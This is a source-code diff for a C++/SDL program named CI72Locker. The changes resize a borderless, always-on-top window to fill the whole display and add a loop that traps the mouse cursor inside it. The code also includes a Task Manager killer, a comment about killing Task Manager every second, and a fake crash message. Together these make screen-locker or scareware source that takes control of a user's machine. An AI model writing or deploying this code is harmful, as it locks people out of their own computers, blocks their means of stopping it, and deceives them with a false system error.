@@ -1,11 +1,11 @@
-#include "CI72Locker.h"
+#include "../include/CI72Locker.h"
 #include <stdio.h>
 #include <SDL_ttf.h>
-#include "TaskmgrKiller.h"
+#include "../include/TaskmgrKiller.h"
 
 const char* testtextline = ":(\nA problem has been detected with your puter, please kill.\n";
 
-Game::Game() : window_dimensions({800, 600}), renderer(nullptr), window(nullptr), shutdown(false), text(nullptr) {
+Game::Game() : window_dimensions({0, 0, 800, 600}), renderer(nullptr), window(nullptr), shutdown(false), text(nullptr), font(nullptr) {
 
 }
 
@@ -31,8 +31,10 @@ int Game::init() {
         fprintf_s(stdout, "%d SDL_ttf Error %d: %s\n", __LINE__, init_return_val, TTF_GetError());
         return -1;
     }
+    SDL_GetDisplayBounds(0, &window_dimensions);
+
     window = SDL_CreateWindow("IAMT 3.5.2 GUI",
-        20, 50, window_dimensions.x, window_dimensions.y,
+        window_dimensions.x, window_dimensions.y, window_dimensions.w, window_dimensions.h,
         SDL_WINDOW_SHOWN | SDL_WINDOW_BORDERLESS | SDL_WINDOW_ALWAYS_ON_TOP  /*SDL_WINDOW_FULLSCREEN*/);
     if (!window) {
         fprintf_s(stdout, "%d SDL Error: %s\n", __LINE__, SDL_GetError());
@@ -59,6 +61,7 @@ int Game::init() {
 
 int Game::input() {
     SDL_Event evt;
+    
 
     while (SDL_PollEvent(&evt)) {
         switch (evt.type) {
@@ -83,11 +86,7 @@ int Game::input() {
             }
             break;
         case SDL_MOUSEMOTION:
-                SDL_WarpMouseGlobal(window_dimensions.x / 2, window_dimensions.y / 2);
-            if (evt.motion.x < 0 || evt.motion.x > window_dimensions.x ||
-                evt.motion.y < 0 || evt.motion.y > window_dimensions.y)
-            {
-            }
+            
             break;
         default:
             break;
@@ -99,6 +98,26 @@ int Game::input() {
 
 int Game::update() {
     // Make a separate process for killing task manager every second or so
+    int x = 0, y = 0;
+    SDL_GetGlobalMouseState(&x, &y);
+
+    if (x > window_dimensions.x + window_dimensions.w - 2) {
+        x = window_dimensions.x + 1;
+     
+    }
+    if (x < window_dimensions.x + 1) {
+        x = window_dimensions.x + window_dimensions.w - 2;
+     
+    }
+
+    if (y > window_dimensions.y + window_dimensions.h - 2) {
+        y = window_dimensions.y + 1;
+     
+    }
+    if (y < window_dimensions.y + 1) {
+        y = window_dimensions.y + window_dimensions.h - 2;
+    }
+        SDL_WarpMouseGlobal(x, y);
     return 0;
 }
 
